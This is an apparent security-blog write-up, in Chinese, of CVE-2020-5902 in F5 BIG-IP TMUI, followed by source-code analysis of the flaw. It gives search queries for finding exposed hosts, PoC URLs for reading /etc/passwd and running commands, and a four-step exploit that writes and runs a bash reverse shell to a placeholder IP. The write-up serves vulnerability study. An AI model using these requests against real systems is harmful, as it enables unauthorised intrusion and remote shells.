<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    CVE-2020-5902 F5 BIG-IP TMUI 远程代码执行漏洞 |
    
    Seikei&#39;s Blog</title>
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<script src="/js/pace.min.js"></script>

<meta name="generator" content="Hexo 4.2.1"></head>

<body>
<main class="content">
  <section class="outer">
  <article id="post-CVE-2020-5902-F5-BigIP-TMUI" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
    
    <div class="article-inner">
        
            <header class="article-header">
                
  
    <h1 class="article-title" itemprop="name">
      CVE-2020-5902 F5 BIG-IP TMUI 远程代码执行漏洞
    </h1>
  
  




            </header>
            

                
                    <div class="article-meta">
                        <a href="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/" class="article-date">
  <time datetime="2020-07-05T16:00:00.000Z" itemprop="datePublished">2020-07-06</time>
</a>
                            
                    </div>
                    

                        
                            
    <div class="tocbot"></div>





                                

                                    <div class="article-entry" itemprop="articleBody">
                                        


                                            

                                                
                                                                    <p>2020年7月1日，F5官方发布了流量管理用户界面(TMUI)远程代码漏洞(CVE-2020-5902)安全通告，未经认证的攻击者，在可以访问TMUI界面的情况下，可对目标实现远程代码执行。</p>
<p>受影响版本：</p>
<p>BIG-IP  15.1.0, 15.0.0, 14.1.0-14.1.2, 13.1.0-13.1.3, 12.1.0-12.1.5, 11.6.1-11.6.5</p>
<a id="more"></a>

<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="资产发现"><a href="#资产发现" class="headerlink" title="资产发现"></a>资产发现</h2><p>Google dork</p>
<ul>
<li><code>inurl: &quot;tmui/login.jsp&quot;</code></li>
<li><code>intitle:&quot;BIG-IP&quot; inurl:&quot;tmui&quot;</code></li>
</ul>
<p>shodan搜索语法</p>
<ul>
<li><p><code>F5-Login-Page</code></p>
</li>
<li><p><code>WWW-Authenticate: Basic realm=BIG-IP</code></p>
</li>
<li><p><code>BigIP</code></p>
</li>
<li><p><code>BIG-IP</code></p>
</li>
<li><p><code>http.favicon.hash:-335242539</code></p>
</li>
<li><p><code>http.title:&quot;BIG-IP&amp;reg;- Redirect&quot;</code></p>
</li>
</ul>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/shodan-f5.png" alt="shodan-f5"></p>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>文件读取：<code>https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></p>
<p>命令执行：<code>https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</code></p>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>1.开启bash<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</code></p>
<p>2.在可执行目录下创建文件并写入需要执行的命令<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/123456&amp;content=bash+-i&gt;%26+/dev/tcp/192.168.1.1/4444+0&gt;%261</code></p>
<p>3.命令执行<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp%2f123456</code></p>
<p>4.还原list命令<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>在 <a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-5902</a> 中下载到所需文件的源码。</p>
<h2 id="为什么要使用-tmui-login-jsp"><a href="#为什么要使用-tmui-login-jsp" class="headerlink" title="为什么要使用/tmui/login.jsp/..;/"></a>为什么要使用/tmui/login.jsp/..;/</h2><p>TMUI原本存在登录限制，使用<code>/..;/</code>是为了绕过登录限制。绕过登录限制是漏洞利用的基础，只有绕过了登录限制，才能无障碍进行后续步骤。</p>
<p>登录限制之后的漏洞非常直接，通过代码审计可以很轻松的找到相应漏洞。</p>
<h2 id="tmshCmd-jsp"><a href="#tmshCmd-jsp" class="headerlink" title="tmshCmd.jsp"></a>tmshCmd.jsp</h2><p>查看<code>tmshCmd_jsp.java</code>文件，在第110行调用<code>WorkspaceUtils.runTmshCommand</code>方法</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/tmshCmd.png" alt="tmshCmd"></p>
<p>追到<code>WorkspaceUtils.runTmshCommand</code>方法，第80行存在command的判断，会禁止一些BadShellCharacters。command会根据空格分成cmdArray数组，并且cmdArray第一个命令必须是<code>create</code>、<code>delete</code>、<code>list</code>、<code>modify</code>，第三个必须被包含在<code>WHITELISTED_TMSH_MODULES</code>中，最后在第83行调用<code>Syscall.callElevated</code>进行tmsh命令执行。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/WorkspaceUtils-runTmshCommand.png" alt="WorkspaceUtils-runTmshCommand"></p>
<p>tmsh有自己一套的命令规则，参考 <a href="https://clouddocs.f5.com/cli/tmsh-reference/latest/general/tmsh.html" target="_blank" rel="noopener">https://clouddocs.f5.com/cli/tmsh-reference/latest/general/tmsh.html</a> 和 <a href="https://clouddocs.f5.com/api/tmsh/Commands.html" target="_blank" rel="noopener">https://clouddocs.f5.com/api/tmsh/Commands.html</a></p>
<p>需配合一定的手法，才能进行代码执行。</p>
<p>这就是为什么Exp中第一步需要执行<code>create cli alias private list command bash</code>命令的原因，将<code>list</code>别名为<code>bash</code>。所以第3步<code>list /tmp%2f123456</code>等效于<code>bash /tmp%2f123456</code>。</p>
<h2 id="fileRead-jsp"><a href="#fileRead-jsp" class="headerlink" title="fileRead.jsp"></a>fileRead.jsp</h2><p><code>fileRead_jsp.java</code>中第101行判断fileName是否在文件白名单中，第105行判断当前用户是否有该文件访问权限。最后在109行调用<code>WorkspaceUtils.readFile</code></p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/fileRead.png" alt="fileRead"></p>
<p>在<code>WorkspaceUtils.readFile</code>方法中直接读取文件并返回，因为使用<code>File</code>对象读取文件，所以可以读取任意文件。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/WorkspaceUtils-readFile.png" alt="WorkspaceUtils-readFile"></p>
<h2 id="fileSave-jsp"><a href="#fileSave-jsp" class="headerlink" title="fileSave.jsp"></a>fileSave.jsp</h2><p><code>fileSave_jsp.java</code>和<code>fileRead_jsp.java</code>中一样，首先对文件进行白名单判断和权限判断，再调用<code>WorkspaceUtils.saveFile</code>方法。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/fileSave.png" alt="fileSave"></p>
<p><code>WorkspaceUtils.saveFile</code>中第176-179行将传入的文件写入文件，导致任意文件可写漏洞。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/WorkspaceUtils-saveFile.png" alt="WorkspaceUtils-saveFile"></p>
<hr>
<p><code>WorkspaceUtils.saveFile</code>中有一点需要额外注意，第180-183行对文件权限和所属权进行了修改，使用的是<code>Runtime.getRuntime().exec()</code>，这可能会导致任意命令执行。</p>
<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/runtime.png" alt="runtime"></p>
<p>但是这里使用的是<code>String []</code>（字符串数组）存储命令，</p>
<p>经过本地测试<code>String []</code>不能使用<code>&amp;&amp;</code>拼接执行多条命令，而<code>String</code>（字符串）可以使用<code>&amp;&amp;</code>拼接多条命令，<code>Runtime.getRuntime().exec()</code>传入字符串和传入字符串数组的执行是有差异的。</p>
<p>所以上述代码虽然将可控变量传入<code>Runtime.getRuntime().exec()</code>中，但无法造成任意命令执行。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-5902</a></p>

                                                                        
                                    </div>
                                    <footer class="article-footer">
                                        <!--<a data-url="http://s31k31.github.io/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/" data-id="ckckkdfnl000303jjgf7lgkg7" class="article-share-link">
                                            分享
                                        </a> -->
                                        
                                    </footer>

    </div>

    
        
  <nav class="article-nav">
    
    
      <a href="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/" class="article-nav-link">
        <strong class="article-nav-caption">后一篇</strong>
        <div class="article-nav-title">CVE-2020-5410 Spring Cloud Config目录遍历漏洞（新）</div>
      </a>
    
  </nav>


            

                
                    
                        
                            

</article>
</section>
  <footer class="footer">
  <div class="outer">
    <ul class="list-inline">
      <li>&copy; 2020 Seikei&#39;s Blog</li>
    </ul>
  </div>
</footer>

</main>
<aside class="sidebar">
  <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/seikei.jpg" alt="Seikei&#39;s Blog"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="https://github.com/s31k31" target="_blank" rel="noopener">Github</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="mailto:s31k31@gmail.com">Email</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        搜索
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
</aside>

<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




  
<script src="/js/tocbot.min.js"></script>

  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>



<script src="/js/ocean.js"></script>


</body>
</html>